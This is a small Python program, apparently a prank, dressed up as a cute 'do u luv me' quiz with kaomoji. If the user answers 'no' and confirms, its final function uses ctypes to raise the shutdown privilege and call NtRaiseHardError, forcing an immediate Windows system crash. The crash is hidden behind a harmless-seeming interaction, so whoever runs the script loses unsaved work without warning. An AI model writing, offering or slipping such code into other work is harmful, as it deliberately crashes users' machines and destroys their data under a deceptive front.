import os


def ask():
    print("(｡♥‿♥｡) do u luv me ?")
    answer = input("> ").strip().lower()

    if answer == "yes":
        yay()
    elif answer == "no":
        sure()
    else:
        print("uhhh i didn't understand that")
        ask()


def yay():
    print("ヽ(✿ﾟ▽ﾟ)ノ yayyy")
    os.system("start yay.mp3")


def sure():
    print("(´・ω・｀) r u sure ?")
    answer = input("> ").strip().lower()

    if answer == "no":
        relief()
    elif answer == "yes":
        doom()
    else:
        print("uhhh i didn't understand that")
        sure()


def relief():
    print("ε-(´∀｀*) ah phew")
    ask()


def doom():
    print("fine")
    final_func()


def final_func():
    from ctypes import windll, c_int, c_uint, c_ulong, POINTER, byref

    nullptr = POINTER(c_int)()

    windll.ntdll.RtlAdjustPrivilege(
        c_uint(19),
        c_uint(1),
        c_uint(0),
        byref(c_int())
    )

    windll.ntdll.NtRaiseHardError(
        c_ulong(0xDEADDEAD),
        c_ulong(0),
        nullptr,
        nullptr,
        c_uint(6),
        byref(c_ulong())
    )


ask()